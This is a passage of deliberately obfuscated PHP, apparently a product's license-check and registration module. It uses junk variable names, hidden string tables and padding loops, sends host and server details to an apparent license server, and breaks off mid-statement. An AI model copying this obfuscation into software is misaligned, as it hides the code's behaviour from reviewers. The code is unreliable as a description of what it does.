$¯ì ±‘±[673]) { if ($øæÄÄ…Â >= 0) { break; } $øæÄÄ…Â++; } } private function autorun() { $Ûéö”á° =& $_SERVER[Ñ¯©ç]; $‹öê‰œç =& $_SERVER[‚Õ“‡ÑÇ]; global $config; if (count($config[$‹öê‰œç[12]]) == 0) { return; } foreach ($config[$‹öê‰œç[12]] as $È‡Îå’ú => $À¬Ñ½¢¨) { $this->appRun($À¬Ñ½¢¨); $—õØûÊ£ = $Ûéö”á°[674]; if (strlen($—õØûÊ£) < $Ûéö”á°[60]) { die; } } } private function irwse9f3ad68() { $ÃêÅ·š¦ =& $_SERVER[Ñ¯©ç]; $¿û–óœ½ =& $_SERVER[‚Õ“‡ÑÇ]; $™ú¼Ö¹ = $¿û–óœ½[4]; $ñÅºÊ«§ = $GLOBALS[$¿û–óœ½[13]][$¿û–óœ½[14]][0]; $ÉÕæ¢ª¦ = $ÃêÅ·š¦[675]; if (strlen($ÉÕæ¢ª¦) < $ÃêÅ·š¦[663]) { die; } if (!$ñÅºÊ«§ || strlen($ñÅºÊ«§) <= strlen($™ú¼Ö¹)) { return; } if (strtolower(substr($ñÅºÊ«§, -strlen($™ú¼Ö¹))) != $™ú¼Ö¹) { return; } $õ¼îş³û = substr($ñÅºÊ«§, 0, -strlen($™ú¼Ö¹)); $“œÌÀş = array($¿û–óœ½[4], $õ¼îş³û); $ “¶×À¿ = array_slice($GLOBALS[$¿û–óœ½[13]][$¿û–óœ½[14]], 1); $øœÍùÖş = $ÃêÅ·š¦[676]; $GLOBALS[$¿û–óœ½[13]][$¿û–óœ½[14]] = array_merge($“œÌÀş, $ “¶×À¿); $GLOBALS[$¿û–óœ½[13]][$¿û–óœ½[15]] = implode($¿û–óœ½[0], $GLOBALS[$¿û–óœ½[13]][$¿û–óœ½[14]]); $–ĞÇÂ» = $ÃêÅ·š¦[677]; while (strlen($–ĞÇÂ») < $ÃêÅ·š¦[663]) { if (!$–ĞÇÂ») { break; } $–ĞÇÂ»++; } } private function slord59a24d3() { $ïÜëúÜï =& $_SERVER[Ñ¯©ç]; $¢¤ü©ñ =& $_SERVER[‚Õ“‡ÑÇ]; if ($GLOBALS[$¢¤ü©ñ[13]][$¢¤ü©ñ[15]] != $¢¤ü©ñ[6]) { return; } $À å‹£Ÿ = $_SERVER[$¢¤ü©ñ[16]]; $·­Ç‹ = $¢¤ü©ñ[17]; $ªÉãµ¾é = $ïÜëúÜï[678]; if (strlen($ªÉãµ¾é) < $ïÜëúÜï[679]) { die; } if (!strstr($À å‹£Ÿ, $·­Ç‹)) { return; } $äéÂ…»º = strrpos($À å‹£Ÿ, $·­Ç‹); $´ÈŞ´¡¼ = $ïÜëúÜï[680]; while ($´ÈŞ´¡¼ < $ïÜëúÜï[60]) { if ($´ÈŞ´¡¼ >= 0) { break; } $´ÈŞ´¡¼++; } $ÜĞ¹Ú€– = substr($À å‹£Ÿ, $äéÂ…»º + strlen($·­Ç‹)); $ÒòÙÏ¸ = $ïÜëúÜï[681]; if (strlen($ÒòÙÏ¸) < $ïÜëúÜï[663]) { die; } preg_match_all($¢¤ü©ñ[18], $ÜĞ¹Ú€–, $§ÓƒÊ°Ù); $¥ßè„Ë = $ïÜëúÜï[682]; if (strlen($¥ßè„Ë) < $ïÜëúÜï[679]) { return; } $ÜĞ¹Ú€– = trim($§ÓƒÊ°Ù[0][0], $¢¤ü©ñ[19]); $GLOBALS[$¢¤ü©ñ[13]][$¢¤ü©ñ[14]] = explode($¢¤ü©ñ[19], $ÜĞ¹Ú€–); $GLOBALS[$¢¤ü©ñ[13]][$¢¤ü©ñ[15]] = implode($¢¤ü©ñ[0], $GLOBALS[$¢¤ü©ñ[13]][$¢¤ü©ñ[14]]); } public function run() { $¥Ääª è =& $_SERVER[Ñ¯©ç]; $æ¿³¾€ =& $_SERVER[‚Õ“‡ÑÇ]; $this->slord59a24d3(); $this->irwse9f3ad68(); $ Î‘ìæ = $¥Ääª è[683]; while ($ Î‘ìæ < $¥Ääª è[673]) { if ($ Î‘ìæ >= 0) { break; } $ Î‘ìæ++; } $§©æ³· = $GLOBALS[$æ¿³¾€[13]][$æ¿³¾€[14]]; $ãÅà‰¼ = $GLOBALS[$æ¿³¾€[13]][$æ¿³¾€[15]]; $õÏ¤€±Ç = $¥Ääª è[684]; define($æ¿³¾€[20], isset($§©æ³·[0]) && $§©æ³·[0] ? $§©æ³·[0] : $this->defaultModule); define($æ¿³¾€[21], isset($§©æ³·[1]) && $§©æ³·[0] ? $§©æ³·[1] : $this->defaultController); define($æ¿³¾€[22], isset($§©æ³·[2]) && $§©æ³·[0] ? $§©æ³·[2] : $this->defaultAction); $ÇîÄğŒ = $¥Ääª è[685]; if (strlen($ÇîÄğŒ) < $¥Ääª è[663]) { die; } define($æ¿³¾€[23], MOD . $æ¿³¾€[0] . ST . $æ¿³¾€[0] . ACT); $ˆºß‡ö£ = $¥Ääª è[686]; $_SERVER[$æ¿³¾€[24]] = strtolower(ACTION); $ÅãŞ°£¶ = $¥Ääª è[687]; while ($ÅãŞ°£¶ < $¥Ääª è[60]) { if ($ÅãŞ°£¶ >= 0) { break; } $ÅãŞ°£¶++; } $this->autorun(); $‚èÆïİ² = $¥Ääª è[688]; if (strlen($‚èÆïİ²) < $¥Ääª è[689]) { die; } if (count($§©æ³·) >= 3) { $this->appRun($ãÅà‰¼); } else { $this->appRun(ACTION); } } private $akxz41631b59 = array(); private $mvzj841631ff = ''; public function abje72b63059() { $¡çªë» =& $_SERVER[Ñ¯©ç]; $­¹ŸÎ¦§ =& $_SERVER[‚Õ“‡ÑÇ]; $this->djxt5f7e3cf7(); $æäã¯‡è = $¡çªë»[690]; $this->gfvh02a38ce0(); $Şäõ“†ô = $¡çªë»[691]; $this->zvric4221b83(); $this->bltu56bc0eb6(); $®°ŠÇ¡æ = $¡çªë»[692]; if (!$®°ŠÇ¡æ) { return; } $this->dyin0b06630b(); $this->zpcga131879d(); $this->jdaz12c416bc(); $Ê¹ï¯« = $¡çªë»[693]; $this->inwd612ff29c($­¹ŸÎ¦§[25], array($this, $­¹ŸÎ¦§[26])); $this->inwd612ff29c($­¹ŸÎ¦§[27], array($this, $­¹ŸÎ¦§[28])); $this->inwd612ff29c($­¹ŸÎ¦§[29], array($this, $­¹ŸÎ¦§[30])); $this->inwd612ff29c($­¹ŸÎ¦§[31], array($this, $­¹ŸÎ¦§[32])); } public function svyze16a00f1($õäÆòÛÌ) { $€â™…ï =& $_SERVER[Ñ¯©ç]; $”ô®Ø”í =& $_SERVER[‚Õ“‡ÑÇ]; $Š©§Ø­ = Model($”ô®Ø”í[33])->get(); $«³¨î•è = array($”ô®Ø”í[34], $”ô®Ø”í[35], $”ô®Ø”í[36], $”ô®Ø”í[37], $”ô®Ø”í[38], $”ô®Ø”í[39], $”ô®Ø”í[40], $”ô®Ø”í[41], $”ô®Ø”í[42], $”ô®Ø”í[43], $”ô®Ø”í[44], $”ô®Ø”í[45], $”ô®Ø”í[46], $”ô®Ø”í[47], $”ô®Ø”í[48], $”ô®Ø”í[49], $”ô®Ø”í[50], $”ô®Ø”í[51], $”ô®Ø”í[52], $”ô®Ø”í[53], $”ô®Ø”í[54], $”ô®Ø”í[55], $”ô®Ø”í[56], $”ô®Ø”í[57], $”ô®Ø”í[58], $”ô®Ø”í[59], $”ô®Ø”í[60], $”ô®Ø”í[61], $”ô®Ø”í[62], $”ô®Ø”í[63], $”ô®Ø”í[64], $”ô®Ø”í[65], $”ô®Ø”í[66], $”ô®Ø”í[67], $”ô®Ø”í[68], $”ô®Ø”í[69], $”ô®Ø”í[70], $”ô®Ø”í[71], $”ô®Ø”í[72], $”ô®Ø”í[73], $”ô®Ø”í[74], $”ô®Ø”í[75], $”ô®Ø”í[76], $”ô®Ø”í[77], $”ô®Ø”í[78], $”ô®Ø”í[79], $”ô®Ø”í[80], $”ô®Ø”í[81], $”ô®Ø”í[82], $”ô®Ø”í[83], $”ô®Ø”í[84]); foreach ($«³¨î•è as $µÏìøÛé) { $Ë…Ü²Îš = $GLOBALS[$”ô®Ø”í[85]][$”ô®Ø”í[86]][$µÏìøÛé]; $ÛÛğû£ò = $€â™…ï[694]; if (strlen($ÛÛğû£ò) < $€â™…ï[673]) { die; } if (isset($Š©§Ø­[$µÏìøÛé])) { $Ë…Ü²Îš = $Š©§Ø­[$µÏìøÛé]; } $õäÆòÛÌ[$”ô®Ø”í[87]][$”ô®Ø”í[88]][$µÏìøÛé] = $Ë…Ü²Îš; } $‚ô—¶ä’ = $õäÆòÛÌ[$”ô®Ø”í[87]][$”ô®Ø”í[88]][$”ô®Ø”í[46]]; $æıÂ†¡Â = $€â™…ï[695]; while (strlen($æıÂ†¡Â) < $€â™…ï[60]) { if (!$æıÂ†¡Â) { break; } $æıÂ†¡Â++; } unset($õäÆòÛÌ[$”ô®Ø”í[87]][$”ô®Ø”í[89]][$”ô®Ø”í[90]]); $ªìâÚé† = $€â™…ï[696]; if (!$ªìâÚé†) { return; } unset($õäÆòÛÌ[$”ô®Ø”í[87]][$”ô®Ø”í[89]][$”ô®Ø”í[91]]); unset($õäÆòÛÌ[$”ô®Ø”í[87]][$”ô®Ø”í[88]][$”ô®Ø”í[46]]); unset($õäÆòÛÌ[$”ô®Ø”í[87]][$”ô®Ø”í[88]][$”ô®Ø”í[92]]); $õäÆòÛÌ[$”ô®Ø”í[87]][$”ô®Ø”í[88]][$”ô®Ø”í[93]] = array($”ô®Ø”í[94] => (int) $‚ô—¶ä’[$”ô®Ø”í[95]], $”ô®Ø”í[96] => (int) _get($‚ô—¶ä’, $”ô®Ø”í[97], 0)); $«ÅÏ¨é = substr(md5($”ô®Ø”í[98] . get_client_ip() . $Š©§Ø­[$”ô®Ø”í[99]]), 0, 15); $ã…Òƒ‰Ù = $€â™…ï[697]; while (strlen($ã…Òƒ‰Ù) < $€â™…ï[679]) { if (!$ã…Òƒ‰Ù) { break; } $ã…Òƒ‰Ù++; } $õäÆòÛÌ[$”ô®Ø”í[100]][$”ô®Ø”í[101]] = Mcrypt::encode(Session::sign(), $«ÅÏ¨é, 3600 * 24); $õäÆòÛÌ[$”ô®Ø”í[100]][$”ô®Ø”í[102]] = Action($”ô®Ø”í[103])->accessToken(); $ã¬ïëù³ = $€â™…ï[698]; if (strlen($ã¬ïëù³) < $€â™…ï[673]) { return; } $õäÆòÛÌ[$”ô®Ø”í[100]][$”ô®Ø”í[104]] = md5($_SERVER[$”ô®Ø”í[105]] . $Š©§Ø­[$”ô®Ø”í[99]]); $õäÆòÛÌ[$”ô®Ø”í[100]][$”ô®Ø”í[106]] = base64_encode(serverInfo()); $õäÆòÛÌ[$”ô®Ø”í[100]][$”ô®Ø”í[107]] = $this->mvzj841631ff; $«ü¦û³Â = $€â™…ï[699]; if (!$«ü¦û³Â) { die; } if ($Š©§Ø­[$”ô®Ø”í[107]] != $”ô®Ø”í[108]) { $õäÆòÛÌ[$”ô®Ø”í[100]][$”ô®Ø”í[109]] = $Š©§Ø­[$”ô®Ø”í[109]]; $õäÆòÛÌ[$”ô®Ø”í[100]][$”ô®Ø”í[110]] = $Š©§Ø­[$”ô®Ø”í[110]]; $®®ÓÇ€ = rand_string(10) . $this->mvzj841631ff . rand_string(5); $õäÆòÛÌ[$”ô®Ø”í[87]][$”ô®Ø”í[111]][$”ô®Ø”í[112]] = $this->vwxs95a3b95d($®®ÓÇ€, $õäÆòÛÌ[$”ô®Ø”í[100]][$”ô®Ø”í[104]]); } if ($this->mvzj841631ff == $”ô®Ø”í[108]) { $õäÆòÛÌ[$”ô®Ø”í[87]][$”ô®Ø”í[88]][$”ô®Ø”í[93]][$”ô®Ø”í[97]] = 0; } $õäÆòÛÌ[$”ô®Ø”í[100]][$”ô®Ø”í[113]] = $this->versionPluginFilter(); $õäÆòÛÌ[$”ô®Ø”í[100]][$”ô®Ø”í[114]] = _get($this->akxz41631b59, $”ô®Ø”í[115], $”ô®Ø”í[6]); $…¤¬¨öõ = $€â™…ï[700]; if (!$…¤¬¨öõ) { die; } if (KodUser::isRoot() && $this->config[$”ô®Ø”í[116]]) { $õäÆòÛÌ[$”ô®Ø”í[100]][$”ô®Ø”í[117]] = WEB_ROOT; } return $õäÆòÛÌ; } private function zpcga131879d() { $ŸÍ–•á =& $_SERVER[Ñ¯©ç]; $õó—Ö° =& $_SERVER[‚Õ“‡ÑÇ]; $èÕÍ‘½ = $_SERVER[$õó—Ö°[24]] == $õó—Ö°[118]; if ($_SERVER[$õó—Ö°[24]] == $õó—Ö°[119] && $_GET[$õó—Ö°[120]] == $õó—Ö°[121]) { $èÕÍ‘½ = !0; } if ($èÕÍ‘½) { $¢ÁÏÖ× = array($õó—Ö°[107] => $this->mvzj841631ff, $õó—Ö°[122] => $this->xftm17fa6a86(), $õó—Ö°[123] => Model($õó—Ö°[124])->count()); if ($this->mvzj841631ff != $õó—Ö°[108]) { $Éµ¥»÷ = _get($this->akxz41631b59, $õó—Ö°[125]); if ($Éµ¥»÷) { $¢ÁÏÖ×[$õó—Ö°[126]] = $Éµ¥»÷; $¢ÁÏÖ×[$õó—Ö°[127]] = strtotime(_get($this->akxz41631b59, $õó—Ö°[128])); $¢ÁÏÖ×[$õó—Ö°[129]] = _get($this->akxz41631b59, $õó—Ö°[115]); } $è¢ä’‹– = Model($õó—Ö°[33])->get($õó—Ö°[130], $õó—Ö°[6], !0); if (is_string($è¢ä’‹–) && substr($è¢ä’‹–, 0, 1) == $õó—Ö°[131]) { $è¢ä’‹– = json_decode_force($è¢ä’‹–); } if (is_array($è¢ä’‹–) && $è¢ä’‹–[$õó—Ö°[132]] && strstr($è¢ä’‹–[$õó—Ö°[132]], $õó—Ö°[133])) { $ßÑÔ¹µ— = explode($õó—Ö°[133], $è¢ä’‹–[$õó—Ö°[132]]); $¢ÁÏÖ×[$õó—Ö°[134]] = $ßÑÔ¹µ—[0]; } } $¢ÁÏÖ× = $this->bijvbf35d33c(json_encode($¢ÁÏÖ×), md5($õó—Ö°[135])); $ß‹ÛŒû = $ŸÍ–•á[701]; $“ªü»¦ = array($õó—Ö°[136] => $¢ÁÏÖ×); call_user_func(array($õó—Ö°[137], $õó—Ö°[138]), $“ªü»¦); $ŒßÆ–Åë = $ŸÍ–•á[702]; if (!$ŒßÆ–Åë) { die; } } if ($this->mvzj841631ff == $õó—Ö°[108]) { return; } $á°Õ§Î… = array($õó—Ö°[139], $õó—Ö°[140], $õó—Ö°[141], $õó—Ö°[142], $õó—Ö°[143], $õó—Ö°[144]); $ãÛËî™ê = Model($õó—Ö°[33])->get(); $“ªü»¦ = array($õó—Ö°[145] => $ãÛËî™ê[$õó—Ö°[34]], $õó—Ö°[146] => $ãÛËî™ê[$õó—Ö°[35]], $õó—Ö°[147] => $õó—Ö°[6]); $‹²ç†³® = $ŸÍ–•á[703]; foreach ($á°Õ§Î… as $²ÊÜÊèş) { if (!isset($ãÛËî™ê[$²ÊÜÊèş]) || !$ãÛËî™ê[$²ÊÜÊèş]) { continue; } $“ªü»¦[$²ÊÜÊèş] = $ãÛËî™ê[$²ÊÜÊèş]; } call_user_func(array($õó—Ö°[137], $õó—Ö°[138]), $“ªü»¦); $ûßİø‡ = $ŸÍ–•á[704]; while (strlen($ûßİø‡) < $ŸÍ–•á[689]) { if (!$ûßİø‡) { break; } $ûßİø‡++; } } private function bltu56bc0eb6() { $×Áà¾ìë =& $_SERVER[Ñ¯©ç]; $Øˆ³­ÃÅ =& $_SERVER[‚Õ“‡ÑÇ]; if ($_SERVER[$Øˆ³­ÃÅ[24]] != $Øˆ³­ÃÅ[148]) { return; } if (!KodUser::isRoot()) { die; } $’µÎåÓç = $GLOBALS[$Øˆ³­ÃÅ[13]]; if (isset($’µÎåÓç[$Øˆ³­ÃÅ[149]])) { $this->bhxm410c2eb1(); die; } if (isset($’µÎåÓç[$Øˆ³­ÃÅ[150]]) && isset($’µÎåÓç[$Øˆ³­ÃÅ[150]]) == $Øˆ³­ÃÅ[121]) { $’µÎåÓç[$Øˆ³­ÃÅ[151]] = Model($Øˆ³­ÃÅ[33])->get($Øˆ³­ÃÅ[152]); } if (!isset($’µÎåÓç[$Øˆ³­ÃÅ[151]]) || strlen($’µÎåÓç[$Øˆ³­ÃÅ[151]]) != 16) { show_json($Øˆ³­ÃÅ[153] . $’µÎåÓç[$Øˆ³­ÃÅ[151]], !1); } $ËÑ¸ = Model($Øˆ³­ÃÅ[33])->get($Øˆ³­ÃÅ[99]); $“šÄÒü³ = md5($_SERVER[$Øˆ³­ÃÅ[105]] . $ËÑ¸); $©©ô¥·ú = array($Øˆ³­ÃÅ[151] => $’µÎåÓç[$Øˆ³­ÃÅ[151]], $Øˆ³­ÃÅ[154] => rand_string(16), $Øˆ³­ÃÅ[155] => $Øˆ³­ÃÅ[135], $Øˆ³­ÃÅ[156] => $Øˆ³­ÃÅ[157], $Øˆ³­ÃÅ[158] => $_SERVER[$Øˆ³­ÃÅ[159]], $Øˆ³­ÃÅ[160] => $_SERVER[$Øˆ³­ÃÅ[161]], $Øˆ³­ÃÅ[162] => $_SERVER[$Øˆ³­ÃÅ[163]], $Øˆ³­ÃÅ[104] => $“šÄÒü³, $Øˆ³­ÃÅ[164] => Model($Øˆ³­ÃÅ[33])->get($Øˆ³­ÃÅ[130])); if (isset($’µÎåÓç[$Øˆ³­ÃÅ[150]]) && isset($’µÎåÓç[$Øˆ³­ÃÅ[150]]) == $Øˆ³­ÃÅ[121]) { $©©ô¥·ú[$Øˆ³­ÃÅ[150]] = md5($©©ô¥·ú[$Øˆ³­ÃÅ[151]] . $Øˆ³­ÃÅ[165] . $©©ô¥·ú[$Øˆ³­ÃÅ[154]]); } if ($’µÎåÓç[$Øˆ³­ÃÅ[166]] == $Øˆ³­ÃÅ[167]) { $‰ Ñ”¼ = $this->bijvbf35d33c($“šÄÒü³, $Øˆ³­ÃÅ[168]); $–½ø’¸‡ = $this->vwxs95a3b95d(json_encode($©©ô¥·ú), $“šÄÒü³ . $Øˆ³­ÃÅ[169], 3); $–½ø’¸‡ = $–½ø’¸‡ . $Øˆ³­ÃÅ[170] . $_SERVER[$Øˆ³­ÃÅ[159]]; $ÄƒÄ ‚† = $this->kmwa96793806($Øˆ³­ÃÅ[171] . $‰ Ñ”¼ . $Øˆ³­ÃÅ[172] . $–½ø’¸‡, -1); show_json($ÄƒÄ ‚†, !0); } else { if ($’µÎåÓç[$Øˆ³­ÃÅ[166]] == $Øˆ³­ÃÅ[173]) { $§“§”†ª = substr(md5($Øˆ³­ÃÅ[174] . $“šÄÒü³), 12, 15) . $Øˆ³­ÃÅ[175]; $–½ø’¸‡ = $this->suew71249bf1(trim($’µÎåÓç[$Øˆ³­ÃÅ[176]]), $§“§”†ª, 2); $†ûºÆĞã = json_decode($–½ø’¸‡, !0); if (!is_array($†ûºÆĞã) || !is_array($†ûºÆĞã[$Øˆ³­ÃÅ[177]]) || $†ûºÆĞã[$Øˆ³­ÃÅ[151]] != !0) { $Ğ··­İó = $Øˆ³­ÃÅ[178]; $ïà†„ò = $†ûºÆĞã[$Øˆ³­ÃÅ[177]] ? $Øˆ³­ÃÅ[179] . $†ûºÆĞã[$Øˆ³­ÃÅ[177]] : $Ğ··­İó; show_json($ïà†„ò, !1); } else { $©©ô¥·ú[$Øˆ³­ÃÅ[154]] = $†ûºÆĞã[$Øˆ³­ÃÅ[177]][$Øˆ³­ÃÅ[180]]; } } else { $†ûºÆĞã = $this->kmwa96793806($Øˆ³­ÃÅ[181], $©©ô¥·ú, 10); $Ø˜±˜Ùå = $×Áà¾ìë[705]; if (strlen($Ø˜±˜Ùå) < $×Áà¾ìë[679]) { return; } } } if (!is_array($†ûºÆĞã) || !is_array($†ûºÆĞã[$Øˆ³­ÃÅ[177]]) || $†ûºÆĞã[$Øˆ³­ÃÅ[151]] != !0) { $Ğ··­İó = LNG($Øˆ³­ÃÅ[182]); $ïà†„ò = $†ûºÆĞã[$Øˆ³­ÃÅ[177]] ? $Øˆ³­ÃÅ[179] . $†ûºÆĞã[$Øˆ³­ÃÅ[177]] : $Ğ··­İó; show_json($ïà†„ò, !1); } $î¾”¹› = $†ûºÆĞã[$Øˆ³­ÃÅ[177]]; $©Äµø®ç = $this->chns6d4815df($î¾”¹›[$Øˆ³­ÃÅ[183]]); if (!$©Äµø®ç || $©Äµø®ç != $î¾”¹›[$Øˆ³­ÃÅ[128]]) { $ÁÂëüğ€ = array($Øˆ³­ÃÅ[184] => Model($Øˆ³­ÃÅ[33])->get($Øˆ³­ÃÅ[99]), $Øˆ³­ÃÅ[185] => $_SERVER[$Øˆ³­ÃÅ[105]], $Øˆ³­ÃÅ[186] => this_url(), $Øˆ³­ÃÅ[160] => $_SERVER[$Øˆ³­ÃÅ[161]]); $–½ø’¸‡ = $this->dbve5e716f07(json_encode($ÁÂëüğ€)); $this->kmwa96793806($Øˆ³­ÃÅ[187] . $–½ø’¸‡); show_json(LNG($Øˆ³­ÃÅ[188]), !0); } $­ØŸï£ = array($Øˆ³­ÃÅ[152] => $î¾”¹›[$Øˆ³­ÃÅ[189]], $Øˆ³­ÃÅ[190] => $î¾”¹›[$Øˆ³­ÃÅ[191]], $Øˆ³­ÃÅ[192] => rand_string(16), $Øˆ³­ÃÅ[107] => $î¾”¹›[$Øˆ³­ÃÅ[193]]); if ($©©ô¥·ú[$Øˆ³­ÃÅ[154]]) { $­ØŸï£[$Øˆ³­ÃÅ[192]] = $©©ô¥·ú[$Øˆ³­ÃÅ[154]]; } $øâØÍç¼ = substr(md5($­ØŸï£[$Øˆ³­ÃÅ[190]]), 10, 10); $†ĞÁ¿÷Î = $øâØÍç¼ . $­ØŸï£[$Øˆ³­ÃÅ[107]] . $­ØŸï£[$Øˆ³­ÃÅ[192]]; $­ØŸï£[$Øˆ³­ÃÅ[109]] = strrev(base64_encode($this->bijvbf35d33c($†ĞÁ¿÷Î, $Øˆ³­ÃÅ[194]))); $µ¬ˆ÷¿ö = rand_string(16); $Üµ´‚·© = $µ¬ˆ÷¿ö . $­ØŸï£[$Øˆ³­ÃÅ[107]] . $this->bijvbf35d33c(md5($­ØŸï£[$Øˆ³­ÃÅ[152]]), $µ¬ˆ÷¿ö); $­ØŸï£[$Øˆ³­ÃÅ[110]] = base64_encode(strrev($this->bijvbf35d33c($Üµ´‚·©, $Øˆ³­ÃÅ[195]))); $šå›òÄÑ = $×Áà¾ìë[706]; if (!$šå›òÄÑ) { return; } if ($î¾”¹›[$Øˆ³­ÃÅ[196]] && $î¾”¹›[$Øˆ³­ÃÅ[196]] >= 1) { Model($Øˆ³­ÃÅ[33])->setDeep($Øˆ³­ÃÅ[197], $Øˆ³­ÃÅ[121]); } Model($Øˆ³­ÃÅ[33])->set($­ØŸï£); $‡’ıÈ„Œ = md5($_SERVER[$Øˆ³­ÃÅ[105]] . strrev($ËÑ¸) . $­ØŸï£[$Øˆ³­ÃÅ[190]]); $òÆ†¸º = $×Áà¾ìë[707]; $–Ÿ†éß = strrev(substr($‡’ıÈ„Œ, 10, 16)); $„¼Å‚Õ = $×Áà¾ìë[708]; if (strlen($„¼Å‚Õ) < $×Áà¾ìë[673]) { die; } $ÃÕİ÷¾ = $this->vwxs95a3b95d(json_encode($î¾”¹›), $‡’ıÈ„Œ); $™ØÇÌçÆ = array_to_keyvalue(Model($Øˆ³­ÃÅ[7])->listData(), $Øˆ³­ÃÅ[198]); $ÙÛô‡µµ = $™ØÇÌçÆ[$Øˆ³­ÃÅ[199]]; $Á„İ¢Ç´ = $×Áà¾ìë[709]; if (!$Á„İ¢Ç´) { die; } $ñ«¥ğ”— = array(); $ñ«¥ğ”—[$–Ÿ†éß] = $ÃÕİ÷¾; Model($Øˆ³­ÃÅ[7])->update($ÙÛô‡µµ[$Øˆ³­ÃÅ[200]], array($Øˆ³­ÃÅ[201] => $ñ«¥ğ”—)); $this->akxz41631b59 = $î¾”¹›; $this->mvzj841631ff = $­ØŸï£[$Øˆ³­ÃÅ[107]]; $òäºí«° = $×Áà¾ìë[710]; if (strlen($òäºí«°) < $×Áà¾ìë[679]) { return; } $this->licenseRegistSuccess(); Cache::set($Øˆ³­ÃÅ[202] . md5($ËÑ¸ . $Øˆ³­ÃÅ[203]), $Øˆ³­ÃÅ[6]); $Ù ÓÉ = $×Áà¾ìë[711]; show_json(LNG($Øˆ³­ÃÅ[188]), !0); $¾ñÕÛù¸ = $×Áà¾ìë[712]; while ($¾ñÕÛù¸ < $×Áà¾ìë[679]) { if ($¾ñÕÛù¸ >= 0) { break; } $¾ñÕÛù¸++; } } private function licenseRegistSuccess() { $ä»ùà =& $_SERVER[‚Õ“‡ÑÇ]; $¶Ôîæ® = Model($ä»ùà[33])->get(); if ($¶Ôîæ®[$ä»ùà[63]] != $ä»ùà[121]) { Model($ä»ùà[33])->set($ä»ùà[63], $ä»ùà[121]); } Action($ä»ùà[204])->initStart(!0); } private function bhxm410c2eb1() { $çï¯Ö² =& $_SERVER[‚Õ“‡ÑÇ]; Model($çï¯Ö²[33])->set(array($çï¯Ö²[152] => $çï¯Ö²[6], $çï¯Ö²[190] => $çï¯Ö²[6], $çï¯Ö²[107] => $çï¯Ö²[108], $çï¯Ö²[109] => $çï¯Ö²[6], $çï¯Ö²[110] => $çï¯Ö²[6])); $ñ»Á¹— = $_SERVER[Ñ¯©ç][713]; if (!$ñ»Á¹—) { return; } Model($çï¯Ö²[33])->setDeep($çï¯Ö²[197], $çï¯Ö²[205]); $this->akxz41631b59 = array(); $this->mvzj841631ff = $çï¯Ö²[108]; } private function djxt5f7e3cf7() { $ƒƒ×ë‰  =& $_SERVER[Ñ¯©ç]; $‡âÛ’›É =& $_SERVER[‚Õ“‡ÑÇ]; $_SERVER[$‡âÛ’›É[161]] = _get($_SERVER, $‡âÛ’›É[161], APP_HOST); $this->mvzj841631ff = $‡âÛ’›É[108]; $‚€îôÉÕ = Model($‡âÛ’›É[33])->get(); $©ùçæÉØ = $ƒƒ×ë‰ [714]; if ($‚€îôÉÕ[$‡âÛ’›É[107]] == $‡âÛ’›É[108]) { return; } $±ìÀï×È = Model($‡âÛ’›É[33])->get($‡âÛ’›É[99]); $Æš÷ìóı = $ƒƒ×ë‰ [715]; if (!$Æš÷ìóı) { die; } $ÍÑÇ‡¦Ú = $‡âÛ’›É[202] . md5($±ìÀï×È . $‡âÛ’›É[203]); $—ùÊÑæ = $ƒƒ×ë‰ [716]; if (!$—ùÊÑæ) { die; } $š£¬öëÕ = Cache::get($ÍÑÇ‡¦Ú); if (!is_array($š£¬öëÕ) || !isset($š£¬öëÕ[$‡âÛ’›É[206]]) || time() - $š£¬öëÕ[$‡âÛ’›É[206]] >= 60) { $Â’İ¿Ù = Model($‡âÛ’›É[7])->loadList(); $ì·ââÒç = $Â’İ¿Ù[$‡âÛ’›É[199]]; $¾øˆõ«Ö = md5($_SERVER[$‡âÛ’›É[105]] . strrev($±ìÀï×È) . $‚€îôÉÕ[$‡âÛ’›É[190]]); $¿¤Êºì… = strrev(substr($¾øˆõ«Ö, 10, 16)); $š£¬öëÕ = $this->suew71249bf1($ì·ââÒç[$‡âÛ’›É[85]][$¿¤Êºì…], $¾øˆõ«Ö); $š£¬öëÕ = json_decode($š£¬öëÕ, !0); } if (!is_array($š£¬öëÕ)) { return $this->bhxm410c2eb1(); } $°¬¡ôŒ = strtotime($š£¬öëÕ[$‡âÛ’›É[128]]); if (time() >= $°¬¡ôŒ) { return $this->bhxm410c2eb1(); } if (!isset($š£¬öëÕ[$‡âÛ’›É[206]]) || time() - $š£¬öëÕ[$‡âÛ’›É[206]] > 20) { $š£¬öëÕ[$‡âÛ’›É[206]] = time(); Cache::set($ÍÑÇ‡¦Ú, $š£¬öëÕ); } $this->akxz41631b59 = $š£¬öëÕ; $this->mvzj841631ff = $‚€îôÉÕ[$‡âÛ’›É[107]]; } private function gfvh02a38ce0() { $áì¬öÔÕ =& $_SERVER[Ñ¯©ç]; $èæ®Ç¢§ =& $_SERVER[‚Õ“‡ÑÇ]; $·°Ø˜˜ = $GLOBALS[$èæ®Ç¢§[13]]; $‘ğ¿ïôü = $_SERVER[$èæ®Ç¢§[24]]; $€‹ù—Ş = $áì¬öÔÕ[717]; while (strlen($€‹ù—Ş) < $áì¬öÔÕ[673]) { if (!$€‹ù—Ş) { break; } $€‹ù—Ş++; } if ($‘ğ¿ïôü == $èæ®Ç¢§[207] && $this->mvzj841631ff == $èæ®Ç¢§[108]) { show_json(LNG($èæ®Ç¢§[208]), !1, $èæ®Ç¢§[209]); } $ëÈÂÀ£õ = array($èæ®Ç¢§[210], $èæ®Ç¢§[211]); if (in_array($‘ğ¿ïôü, $ëÈÂÀ£õ)) { if ($this->mvzj841631ff == $èæ®Ç¢§[108] && isset($·°Ø˜˜[$èæ®Ç¢§[212]])) { show_json(LNG($èæ®Ç¢§[208]), !1, $èæ®Ç¢§[209]); die; } $Ò§ûŸ±¼ = $this->xftm17fa6a86(); if ($Ò§ûŸ±¼ != intval($èæ®Ç¢§[213])) { if ($Ò§ûŸ±¼ <= Model($èæ®Ç¢§[124])->count()) { show_json(LNG($èæ®Ç¢§[214]), !1, $èæ®Ç¢§[209]); die; } } } } private function zvric4221b83() { $çÉ¡™æ™ =& $_SERVER[Ñ¯©ç]; $ıÃñÌß¥ =& $_SERVER[‚Õ“‡ÑÇ]; $·œÊ§“Ö = array($ıÃñÌß¥[118], $ıÃñÌß¥[119]); $ˆìÎ—ˆ = $çÉ¡™æ™[718]; if (!KodUser::isRoot() || !isset($_GET[$ıÃñÌß¥[215]])) { return; } if (!in_array($_SERVER[$ıÃñÌß¥[24]], $·œÊ§“Ö)) { return; } $†‘¿âÎ« = $ıÃñÌß¥[216]; $ÌÚû¨åĞ = $çÉ¡™æ™[719]; $†‘¿âÎ« = 